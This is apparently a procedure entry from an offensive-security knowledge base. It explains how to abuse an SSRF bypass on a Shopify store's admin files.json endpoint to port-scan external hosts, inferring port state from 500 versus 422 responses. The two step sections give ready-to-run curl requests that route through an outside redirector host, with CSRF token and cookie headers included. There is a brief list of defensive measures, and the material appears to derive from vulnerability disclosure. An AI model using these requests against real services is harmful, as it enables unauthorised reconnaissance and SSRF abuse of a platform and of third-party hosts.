---
tags:
  - ssrf
  - port-scanning
  - shopify
type: procedure
tools:
  - '[[tools/Wireshark]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/perform-port-scan-on-external-host]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Service Scanning]]'
updated_at: '2025-12-14T04:39:02.416Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[T1046.001]]'
id: 8cf08e85-3049-429b-a3b8-19c66b650dbe
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Network Service Scanning]]'
---
# Perform-Port-Scanning-via-SSRF-Redirects

## Summary

This procedure uses the SSRF bypass to scan ports on arbitrary external hosts by observing differential server responses (500 for open, 422 for closed).

## Description

With redirection in place, repeated requests to /admin/settings/files.json with varying ports in the redirect target allow inference of port status. For example, scanme.nmap.org:22 (SSH, open) yields 500 Internal Server Error due to failed image fetch on non-HTTP port, while :1 (closed) yields 422. This enables reconnaissance from Shopify's internal vantage point, potentially revealing services hidden by external firewalls.

## Requirements

1. Working SSRF bypass via redirector
2. List of target ports (e.g., 1,22,80)
3. Scriptable HTTP client for automation

## Defense

Defensive measures and detection strategies:

- Rate-limit image insertion requests per user/session
- Implement port-specific blacklisting post-redirect
- Anomaly detection on response code patterns indicating scanning

## Objectives

1. Identify open ports on target hosts
2. Gather intelligence on internal vs external accessibility
3. Demonstrate SSRF impact for reconnaissance

## Instructions

### Step 1: Test Closed Port

**Context**: Send request for a known closed port to baseline 422 response.

**Command** ([[commands/perform-port-scan-on-external-host]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:1'
```

> Expected output: HTTP 422, indicating no connection.

### Step 2: Test Open Port

**Context**: Probe a known open port to confirm 500 response.

**Command** ([[commands/perform-port-scan-on-external-host]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:22'
```

> Expected output: HTTP 500, confirming open port detection.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Network Service Scanning]]

### Sub-Techniques

- [[T1046.001]]

## Commands Used

- [[commands/perform-port-scan-on-external-host]]

## Tools Used

- [[tools/Wireshark]]

## Tags

- ssrf
- port-scanning
